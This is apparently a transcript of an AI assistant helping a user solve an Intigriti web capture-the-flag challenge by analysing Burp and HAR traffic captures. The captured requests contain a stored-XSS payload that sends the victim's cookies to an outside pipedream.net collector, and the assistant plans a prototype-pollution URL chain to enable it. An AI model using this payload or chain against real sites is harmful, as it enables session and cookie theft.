+Tue Apr 21 08:54:11 NPT 2026 [5] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 08:55:34 NPT 2026 [4] POST 200 https://challenge-0426.intigriti.io/api/notes
+Tue Apr 21 08:55:52 NPT 2026 [3] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 08:56:22 NPT 2026 [2] GET 200 /note/c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+Tue Apr 21 08:56:23 NPT 2026 [0] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 08:56:23 NPT 2026 [1] GET 200 ?note=c9d71c138b8731192486138c16d9533e4d7c72274efec26f7d7c9907b560e24c
+Now the full picture is clear chronologically:
+
+08:52:24 [9] - Visit main page
+08:52:27 [8] - Visit /challenge (GET prefs response: empty presets)
+08:52:43 [7] - GET account/preferences → readerPresets: {}, presetCount: 0 (EMPTY PREFS)
+08:54:10 [6] - Visit /challenge again
+08:54:11 [5] - GET account/preferences → readerPresets: {"summary": {renderMode: "full",...}}, presetCount: 1 (FULL PREFS)
+08:55:34 [4] - POST create note → created c9d71c...
+08:55:52 [3] - POST notes/lookup
+08:56:22 [2] - GET note page
+08:56:23 [0] - GET prefs (304)
+08:56:23 [1] - GET manifest → returns SAFE
+Between [7] (empty prefs at 08:52:43) and [5] (full prefs at 08:54:11), the user must have POSTed to set the readerPresets. This POST request is NOT in the Burp capture (probably was done via Burp Repeater and not saved to HTTP history).
+
+So the sequence is correct:
+
+Set readerPresets to full (not captured, happened between [7] and [5])
+Create note [4]
+Visit note [2]
+Manifest [1] returns SAFE
+This definitively proves: readerPresets do NOT affect the manifest endpoint. The prefs are stored but not applied to the manifest.
+
+OK so now I need to think about the actual solution differently.
+
+Going back to basics. The ONLY way to get renderMode: full is via applyRemoteProfile which reads from the manifest. The manifest always returns safe.
+
+Unless... there's a server-side endpoint that controls the manifest and we haven't found it.
+
+Or: maybe the attack doesn't require renderMode: full at all, and I've been missing another attack vector.
+
+Let me re-read processEnhancements very carefully:
+
+js
+function processEnhancements(root) {
+  var policies = loadContentPolicies();
+  if (!policies.enableEnhancements) return;  // ← gated by renderMode: full
+  ...
+}
+loadContentPolicies checks mode === 'full' for everything. There's no way around this.
+
+…
+
+Show more
+Done
+Critical timestamp finding:
+
+08:52:43 [7] prefs → empty readerPresets
+  ← (POST to set full presets, NOT captured)
+08:54:11 [5] prefs → FULL readerPresets confirmed (presetCount:1)
+08:55:34 [4] note CREATED
+08:56:23 [1] manifest → still SAFE ❌
+Conclusion: readerPresets have ZERO effect on manifest, regardless of creator vs visitor session. The preset is stored but the server ignores it for the manifest endpoint.
+
+The actual attack is prototype pollution + a manifest missing renderMode.
+
+Look at applyRemoteProfile:
+
+js
+if (typeof profile.renderMode === 'string') {
+  APP.renderMode = profile.renderMode;  // only runs if own property!
+}
+If profile has NO own renderMode, profile.renderMode resolves via prototype chain. If we've polluted Object.prototype.renderMode = 'full' → APP.renderMode = 'full' gets set as OWN property → getOwnString finds it ✓
+
+The two-part attack:
+
+Part 1 — Set readerPresets WITHOUT renderMode (only widgetTypes + widgetSink):
+
+json
+{
+  "readerPresets": {
+    "summary": {
+      "widgetTypes": ["custom"],
+      "widgetSink": "script"
+    }
+  }
+}
+If the server applies your preset to the manifest profile but omits renderMode (since you didn't set it), the manifest returns {profile: {widgetTypes: ["custom"], widgetSink: "script"}} — no own renderMode.
+
+Part 2 — Prototype pollution in the hash URL you report to bot:
+
+/note/{id}/summary#constructor[prototype][renderMode]=full
+Flow on bot's page:
+
+parseThemeParams() → Object.prototype.renderMode = 'full'
+loadPanelManifest() → manifest returns {profile: {widgetTypes:["custom"], widgetSink:"script"}} ← no renderMode
+applyRemoteProfile(profile) → typeof profile.renderMode === 'string' → checks prototype → 'full' → APP.renderMode = 'full' ✓
+DOMPurify allows data-attrs → widget fires → flag stolen
+Test now in Burp Repeater: POST readerPresets WITHOUT renderMode, then fresh manifest fetch. Does it return {profile: {widgetTypes: ["custom"], widgetSink: "script"}} with no renderMode?
+
+You said: git pull with session.
+git pull with session.xml and session.har. the manifest doesn't apply to me as full, you may be able to check out.
+
+9:24 AM
+Claude responded: Key finding from the manifest request headers — no Cookie was sent:
+
+Investigated manifest caching and theorized creator-based preset exploitation
+Investigated manifest caching and theorized creator-based preset exploitation
+Let me pull the repo and check the new files.
+
+
+Pull and list new files
+bash
+
+cd /home/claude/CTF && git pull 2>&1 && ls -la *.xml *.har 2>/dev/null
+Output
+
+From https://github.com/KarinaFromAespa/CTF
+   c751c10..b2b0d6c  main       -> origin/main
+Updating c751c10..b2b0d6c
+Fast-forward
+ 804576bc8115ce7477895a776ca331f0.har | 6926 ++++++++++++++++++++++++++++++++++
+ 804576bc8115ce7477895a776ca331f0.xml |  394 ++
+ 2 files changed, 7320 insertions(+)
+ create mode 100644 804576bc8115ce7477895a776ca331f0.har
+ create mode 100644 804576bc8115ce7477895a776ca331f0.xml
+-rw-r--r-- 1 root root 391451 Apr 21 03:39 804576bc8115ce7477895a776ca331f0.har
+-rw-r--r-- 1 root root  93479 Apr 21 03:39 804576bc8115ce7477895a776ca331f0.xml
+-rw-r--r-- 1 root root 153158 Apr 20 15:14 CTF.xml
+-rw-r--r-- 1 root root 157551 Apr 21 03:03 New.xml
+-rw-r--r-- 1 root root  52751 Apr 21 03:20 New1.xml
+
+List all XML items sorted by time
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+print(f'Total: {len(items)}')
+
+data = []
+for i, item in enumerate(items):
+    t = item.findtext('time','')
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    status = item.findtext('status','')
+    data.append((t, i, method, status, url))
+
+for t, i, method, status, url in sorted(data):
+    print(f'{t} [{i:2d}] {method:4s} {status} {url[-80:]}')
+"
+Output
+
+Total: 23
+Tue Apr 21 09:15:44 NPT 2026 [22] GET  304 https://challenge-0426.intigriti.io/
+Tue Apr 21 09:15:46 NPT 2026 [18] GET  200 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 09:15:46 NPT 2026 [19] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 09:15:46 NPT 2026 [20] GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js.map
+Tue Apr 21 09:15:46 NPT 2026 [21] GET  200 https://challenge-0426.intigriti.io/challenge
+Tue Apr 21 09:15:48 NPT 2026 [17] GET  200 https://challenge-0426.intigriti.io/challenge
+Tue Apr 21 09:15:54 NPT 2026 [14] GET  304 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 09:15:54 NPT 2026 [15] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 09:15:54 NPT 2026 [16] GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js.map
+Tue Apr 21 09:16:12 NPT 2026 [13] GET  200 https://challenge-0426.intigriti.io/challenge
+Tue Apr 21 09:16:25 NPT 2026 [10] GET  200 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 09:16:25 NPT 2026 [11] GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js.map
+Tue Apr 21 09:16:25 NPT 2026 [12] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 09:17:48 NPT 2026 [ 9] POST 200 https://challenge-0426.intigriti.io/api/notes
+Tue Apr 21 09:18:03 NPT 2026 [ 8] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 09:19:05 NPT 2026 [ 7] GET  200 https://challenge-0426.intigriti.io/challenge
+Tue Apr 21 09:19:06 NPT 2026 [ 4] GET  200 https://challenge-0426.intigriti.io/api/account/preferences
+Tue Apr 21 09:19:06 NPT 2026 [ 5] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+Tue Apr 21 09:19:06 NPT 2026 [ 6] GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js.map
+Tue Apr 21 09:19:23 NPT 2026 [ 3] GET  200 tigriti.io/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+Tue Apr 21 09:19:30 NPT 2026 [ 1] GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js.map
+Tue Apr 21 09:19:30 NPT 2026 [ 2] GET  200 ifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+Tue Apr 21 09:19:31 NPT 2026 [ 0] GET  304 https://challenge-0426.intigriti.io/api/account/preferences
+
+Decode key items with timestamps and cookies
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET, base64
+
+tree = ET.parse('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+def decode(el):
+    if el is None: return ''
+    if el.get('base64') == 'true': return base64.b64decode(el.text).decode('utf-8', errors='replace')
+    return el.text or ''
+def body(s):
+    i = s.find('\r\n\r\n')
+    return s[i+4:] if i != -1 else s
+def cookie(s):
+    for line in s.split('\r\n'):
+        if line.lower().startswith('cookie:'): return line[8:].strip()
+    return ''
+
+# Focus on key items sorted by time
+key = [18, 10, 4, 9, 3, 2, 0]
+for i in key:
+    item = items[i]
+    t = item.findtext('time','')
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    status = item.findtext('status','')
+    req = decode(item.find('request'))
+    resp = decode(item.find('response'))
+    req_body = body(req)
+    resp_body = body(resp)
+    ck = cookie(req)
+    print(f'=== [{i}] {t} | {method} {status}')
+    print(f'    URL: {url[-80:]}')
+    print(f'    Cookie: {ck[:60]}')
+    if req_body.strip(): print(f'    REQ: {req_body[:300]}')
+    print(f'    RESP: {resp_body[:400]}')
+    print()
+"
+Output
+
+=== [18] Tue Apr 21 09:15:46 NPT 2026 | GET 200
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+
+=== [10] Tue Apr 21 09:16:25 NPT 2026 | GET 200
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+
+=== [4] Tue Apr 21 09:19:06 NPT 2026 | GET 200
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summary":{"widgetTypes":["custom"],"widgetSink":"script"}}},"stats":{"presetCount":1}}
+
+=== [9] Tue Apr 21 09:17:48 NPT 2026 | POST 200
+    URL: https://challenge-0426.intigriti.io/api/notes
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    REQ: {"title":"XSS2","content":"<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\"></div>"}
+    RESP: {"success":true,"id":"e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f","url":"/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f"}
+
+=== [3] Tue Apr 21 09:19:23 NPT 2026 | GET 200
+    URL: tigriti.io/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+      <a href="/" class="brand">
+        <svg class="brand-icon" viewBox="0 0 24 24" fill="none" st
+
+=== [2] Tue Apr 21 09:19:30 NPT 2026 | GET 200
+    URL: ifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+=== [0] Tue Apr 21 09:19:31 NPT 2026 | GET 304
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+    RESP: 
+
+Now I have the definitive picture:
+
+Session 804576bc8115ce7477895a776ca331f0:
+
+09:15:46 [18] prefs → empty readerPresets
+09:16:25 [10] prefs → empty readerPresets (still empty)
+(between [10] and [9], user set readerPresets WITHOUT renderMode: {summary: {widgetTypes:["custom"], widgetSink:"script"}})
+09:17:48 [9] create note → e6007144403f...
+09:19:06 [4] prefs → {readerPresets: {summary: {widgetTypes:["custom"], widgetSink:"script"}}} presetCount:1
+Wait, [4] is at 09:19:06 but [9] (create note) is at 09:17:48. So the prefs with custom widgetTypes were set BEFORE the note was created. But [4] is AFTER the note creation chronologically (09:19:06 > 09:17:48). But the content of [4] shows the preset was already there at 09:19:06.
+
+Actually the POST to set the preset must have happened between [10] (09:16:25, empty prefs) and [9] (09:17:48, note creation). The [4] GET at 09:19:06 just confirms the preset was there.
+
+Then:
+
+09:19:23 [3] note page loaded
+09:19:30 [2] manifest fetched → {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"} STILL SAFE
+So:
+
+Preset set to {widgetTypes: ["custom"], widgetSink: "script"} (NO renderMode)
+Note created AFTER preset set
+Manifest still returns {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"}
+The manifest IGNORES the readerPresets completely. It has its own default configuration.
+
+This is definitive. The readerPresets stored in account preferences have NO EFFECT on the manifest endpoint. The manifest is hardcoded/computed independently.
+
+Now, the KEY observation: the user set {widgetTypes: ["custom"], widgetSink: "script"} WITHOUT renderMode. The manifest returned {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"} - the manifest's profile has an OWN renderMode: "safe".
+
+So prototype pollution for renderMode = 'full' would be shadowed by the manifest's own renderMode: "safe" property.
+
+…
+
+Show less
+
+List all HAR entries chronologically
+bash
+
+python3 -c "
+import json
+with open('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.har') as f:
+    har = json.load(f)
+
+entries = har['log']['entries']
+print(f'Total HAR entries: {len(entries)}')
+for i, e in enumerate(entries):
+    t = e['startedDateTime']
+    req = e['request']
+    resp = e['response']
+    print(f'[{i:2d}] {t[11:19]} {req[\"method\"]:4s} {resp[\"status\"]} {req[\"url\"][-80:]}')
+"
+Output
+
+Total HAR entries: 39
+[ 0] 03:30:48 GET  200 https://challenge-0426.intigriti.io/challenge
+[ 1] 03:30:53 GET  304 https://challenge-0426.intigriti.io/css/challenge-style.css
+[ 2] 03:30:53 GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js
+[ 3] 03:30:53 GET  304 https://challenge-0426.intigriti.io/js/app.js
+[ 4] 03:30:53 GET  200 y=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap
+[ 5] 03:30:54 POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[ 6] 03:30:54 GET  304 https://challenge-0426.intigriti.io/api/account/preferences
+[ 7] 03:30:54 GET  200 https://fonts.gstatic.com/s/inter/v20/UcC73FwrK3iLTeHuS_nVMrMxCp50SjIa1ZL7.woff2
+[ 8] 03:30:54 GET  200 ono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2
+[ 9] 03:31:12 GET  200 https://challenge-0426.intigriti.io/challenge
+[10] 03:31:22 GET  200 https://challenge-0426.intigriti.io/css/challenge-style.css
+[11] 03:31:22 GET  200 https://challenge-0426.intigriti.io/js/vendor/purify.min.js
+[12] 03:31:22 GET  200 https://challenge-0426.intigriti.io/js/app.js
+[13] 03:31:22 GET  200 y=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap
+[14] 03:31:23 GET  200 https://fonts.gstatic.com/s/inter/v20/UcC73FwrK3iLTeHuS_nVMrMxCp50SjIa1ZL7.woff2
+[15] 03:31:23 GET  200 ono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2
+[16] 03:31:25 POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[17] 03:31:25 GET  200 https://challenge-0426.intigriti.io/api/account/preferences
+[18] 03:31:25 GET  200 https://challenge-0426.intigriti.io/favicon.ico
+[19] 03:32:48 POST 200 https://challenge-0426.intigriti.io/api/notes
+[20] 03:33:03 POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[21] 03:34:05 GET  200 https://challenge-0426.intigriti.io/challenge
+[22] 03:34:06 GET  200 https://challenge-0426.intigriti.io/css/challenge-style.css
+[23] 03:34:06 GET  200 https://challenge-0426.intigriti.io/js/vendor/purify.min.js
+[24] 03:34:06 GET  200 https://challenge-0426.intigriti.io/js/app.js
+[25] 03:34:06 GET  200 y=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap
+[26] 03:34:06 GET  200 https://fonts.gstatic.com/s/inter/v20/UcC73FwrK3iLTeHuS_nVMrMxCp50SjIa1ZL7.woff2
+[27] 03:34:06 GET  200 ono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwg.woff2
+[28] 03:34:06 POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[29] 03:34:06 GET  200 https://challenge-0426.intigriti.io/api/account/preferences
+[30] 03:34:07 GET  200 https://challenge-0426.intigriti.io/favicon.ico
+[31] 03:34:23 GET  200 tigriti.io/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+[32] 03:34:30 GET  304 https://challenge-0426.intigriti.io/css/challenge-style.css
+[33] 03:34:30 GET  304 https://challenge-0426.intigriti.io/js/vendor/purify.min.js
+[34] 03:34:30 GET  304 https://challenge-0426.intigriti.io/js/app.js
+[35] 03:34:30 GET  200 y=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap
+[36] 03:34:30 GET  200 https://fonts.gstatic.com/s/inter/v20/UcC73FwrK3iLTeHuS_nVMrMxCp50SjIa1ZL7.woff2
+[37] 03:34:30 GET  200 ifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+[38] 03:34:31 GET  304 https://challenge-0426.intigriti.io/api/account/preferences
+
+Decode key HAR entries - prefs, note creation, manifest
+bash
+
+python3 -c "
+import json
+with open('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.har') as f:
+    har = json.load(f)
+
+entries = har['log']['entries']
+
+# Key entries: prefs, note creation, manifest
+for i in [17, 29, 19, 37]:
+    e = entries[i]
+    req = e['request']
+    resp = e['response']
+    print(f'=== [{i}] {e[\"startedDateTime\"][11:19]} {req[\"method\"]} {resp[\"status\"]}')
+    print(f'    URL: {req[\"url\"][-80:]}')
+    
+    # Show request cookies and body
+    for h in req.get('headers', []):
+        if h['name'].lower() == 'cookie':
+            print(f'    Cookie: {h[\"value\"][:80]}')
+    if req.get('postData'):
+        print(f'    REQ: {req[\"postData\"].get(\"text\",\"\")[:300]}')
+    
+    # Show response body
+    rc = resp.get('content',{})
+    txt = rc.get('text','')
+    print(f'    RESP: {txt[:400]}')
+    print()
+"
+Output
+
+=== [17] 03:31:25 GET 200
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    RESP: 
+
+=== [29] 03:34:06 GET 200
+    URL: https://challenge-0426.intigriti.io/api/account/preferences
+    RESP: 
+
+=== [19] 03:32:48 POST 200
+    URL: https://challenge-0426.intigriti.io/api/notes
+    REQ: {"title":"XSS2","content":"<div id=\\\"enhance-config\\\" data-types=\\\"custom\\\"></div><div data-enhance=\\\"custom\\\" data-cfg=\\\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\\\"></div>"}
+    RESP: 
+
+=== [37] 03:34:30 GET 200
+    URL: ifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+    RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+
+Find any POST to preferences and full manifest details
+bash
+
+python3 -c "
+import json
+with open('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.har') as f:
+    har = json.load(f)
+
+entries = har['log']['entries']
+
+# Check ALL entries for any POST to preferences
+for i, e in enumerate(entries):
+    url = e['request']['url']
+    method = e['request']['method']
+    if 'preferences' in url and method == 'POST':
+        print(f'[{i}] POST preferences found!')
+        print(e['request'].get('postData',{}))
+
+# Also check the full manifest URL
+for i, e in enumerate(entries):
+    url = e['request']['url']
+    if 'manifest' in url:
+        print(f'[{i}] Manifest: {url}')
+        # Check all query params
+        for p in e['request'].get('queryString', []):
+            print(f'  param: {p}')
+        # Full response
+        txt = e['response']['content'].get('text','')
+        print(f'  RESP: {txt}')
+
+# Also check the note page for APP_INIT
+e = entries[31]
+txt = e['response']['content'].get('text','')
+idx = txt.find('APP_INIT')
+if idx >= 0:
+    print('APP_INIT:', txt[idx-5:idx+300])
+"
+Output
+
+[37] Manifest: https://challenge-0426.intigriti.io/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/summary/manifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+  param: {'name': 'note', 'value': 'e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f'}
+  RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+APP_INIT: ow.__APP_INIT__     = {"theme":"dark","panel":"summary","noteId":"e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f"};
+    window.__NOTE_CONTENT__ = "\u003cdiv id=\"enhance-config\" data-types=\"custom\">\u003c/div>\u003cdiv data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https:/
+
+Search for any full mode or readerPresets in all responses
+bash
+
+python3 -c "
+import json
+with open('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.har') as f:
+    har = json.load(f)
+entries = har['log']['entries']
+
+# Check ALL responses for any 'full' renderMode or interesting data
+for i, e in enumerate(entries):
+    txt = e['response']['content'].get('text','')
+    if 'full' in txt.lower() or 'readerPreset' in txt:
+        print(f'[{i}] {e[\"request\"][\"url\"][-60:]}')
+        print(txt[:300])
+        print()
+
+# Check if there's a POST to set preferences (with readerPresets in body) -- maybe it was in the XML
+import xml.etree.ElementTree as ET, base64
+tree = ET.parse('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    method = item.findtext('method','')
+    if 'preferences' in url and method == 'POST':
+        print(f'XML [{i}] POST preferences!')
+    # Also check if any request body has readerPresets
+    req_el = item.find('request')
+    if req_el is not None:
+        req = base64.b64decode(req_el.text).decode('utf-8', errors='replace') if req_el.get('base64') == 'true' else req_el.text or ''
+        if 'readerPreset' in req or 'renderMode' in req:
+            print(f'XML [{i}] {method} {item.findtext(\"url\",\"\")[-60:]} has readerPresets in REQ')
+            body_start = req.find('\r\n\r\n')
+            print(req[body_start+4:body_start+300])
+"
+Output
+
+[34] https://challenge-0426.intigriti.io/js/app.js
+(function () {
+  'use strict';
+
+  var APP = window.__APP_INIT__ || {};
+
+  var DEFAULTS = {
+    maxNoteLength: 50000,
+    searchDebounce: 300,
+    apiBase: '/api'
+  };
+
+  var ACCOUNT_PREFERENCES_API = DEFAULTS.apiBase + '/account/preferences';
+
+  // Settings helpers.
+
+  function mergeF
+
+[38] https://challenge-0426.intigriti.io/api/account/preferences
+{"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summary":{"widgetTypes":["custom"],"widgetSink":"script"}}},"stats":{"presetCount":1}}
+
+Now I have the full picture:
+
+Timeline:
+
+03:31:25 [17] GET prefs → (empty, 304 in XML but 200 in HAR with empty preset)
+Between [17] and [19]: User set readerPresets {summary: {widgetTypes: ["custom"], widgetSink: "script"}} (NO renderMode) - this POST is NOT captured
+03:32:48 [19] POST create note → e6007144...
+03:34:06 [29] GET prefs → 200 (content probably shows full presets)
+03:34:23 [31] GET note page
+03:34:30 [37] GET manifest → {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"}
+03:34:31 [38] GET prefs → {readerPresets: {summary: {widgetTypes: ["custom"], widgetSink: "script"}}} presetCount: 1 ← confirms the preset was stored
+The manifest at [37] returns {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"} DESPITE having a readerPreset with {widgetTypes: ["custom"], widgetSink: "script"}.
+
+The readerPresets are being COMPLETELY IGNORED by the manifest endpoint.
+
+The manifest hardcodes:
+
+summary: {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"}
+print: {renderMode: "safe", widgetTypes: ["counter"], widgetSink: "text", theme: "light"}
+compact: {renderMode: "safe", widgetTypes: [], widgetSink: "text"}
+No matter what presets are set, the manifest returns these hardcoded values. The readerPresets field in the preferences API might be a complete red herring.
+
+So the REAL question is: how do we get renderMode: full? And the answer can only come from:
+
+The manifest returning a profile without renderMode (then prototype pollution on Object.prototype.renderMode kicks in for applyRemoteProfile)
+Some other path
+BUT WAIT: from the manifest response {renderMode: "safe", widgetTypes: ["counter", "progress"], widgetSink: "text"}, there's always an OWN renderMode: "safe" property. Prototype pollution can't override own properties.
+
+Unless... we can manipulate the manifest URL to hit a different endpoint that returns different JSON.
+
+…
+
+Show less
+
+Full manifest request/response headers and prefs context
+bash
+
+python3 -c "
+import json
+with open('/home/claude/CTF/804576bc8115ce7477895a776ca331f0.har') as f:
+    har = json.load(f)
+entries = har['log']['entries']
+
+# Full details on manifest request [37]
+e = entries[37]
+print('=== MANIFEST REQUEST [37] ===')
+print('URL:', e['request']['url'])
+print('METHOD:', e['request']['method'])
+print('REQUEST HEADERS:')
+for h in e['request']['headers']:
+    print(f'  {h[\"name\"]}: {h[\"value\"]}')
+print('QUERY PARAMS:')
+for p in e['request'].get('queryString', []):
+    print(f'  {p}')
+print()
+print('RESPONSE STATUS:', e['response']['status'])
+print('RESPONSE HEADERS:')
+for h in e['response']['headers']:
+    print(f'  {h[\"name\"]}: {h[\"value\"]}')
+print('RESPONSE BODY:', e['response']['content'].get('text',''))
+print()
+
+# Also check prefs request just before/after
+for i in [29, 38]:
+    e2 = entries[i]
+    print(f'=== PREFS [{i}] ===')
+    print('URL:', e2['request']['url'])
+    for h in e2['request']['headers']:
+        if h['name'].lower() == 'cookie': print('  Cookie:', h['value'])
+    print('RESP:', e2['response']['content'].get('text','')[:300])
+    print()
+"
+Output
+
+=== MANIFEST REQUEST [37] ===
+URL: https://challenge-0426.intigriti.io/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/summary/manifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+METHOD: GET
+REQUEST HEADERS:
+  :authority: challenge-0426.intigriti.io
+  :method: GET
+  :path: /note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/summary/manifest.json?note=e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f
+  :scheme: https
+  accept: application/json
+  accept-encoding: gzip, deflate, br, zstd
+  accept-language: en-US,en;q=0.9
+  priority: u=1, i
+  sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
+  sec-ch-ua-mobile: ?0
+  sec-ch-ua-platform: "Windows"
+  sec-fetch-dest: empty
+  sec-fetch-mode: cors
+  sec-fetch-site: same-origin
+  user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+QUERY PARAMS:
+  {'name': 'note', 'value': 'e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f'}
+
+RESPONSE STATUS: 200
+RESPONSE HEADERS:
+  content-length: 90
+  content-security-policy: default-src 'self'; script-src 'nonce-ymoeF/QNLZJ16SUw/uWdKw==' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src *; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
+  content-type: application/json; charset=utf-8
+  date: Tue, 21 Apr 2026 03:34:31 GMT
+  etag: W/"5a-xpejJnk2niFUmVKyLj+WXoyjCw8"
+  referrer-policy: no-referrer
+  strict-transport-security: max-age=31536000; includeSubDomains
+  x-content-type-options: nosniff
+  x-powered-by: Express
+RESPONSE BODY: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+=== PREFS [29] ===
+URL: https://challenge-0426.intigriti.io/api/account/preferences
+RESP: 
+
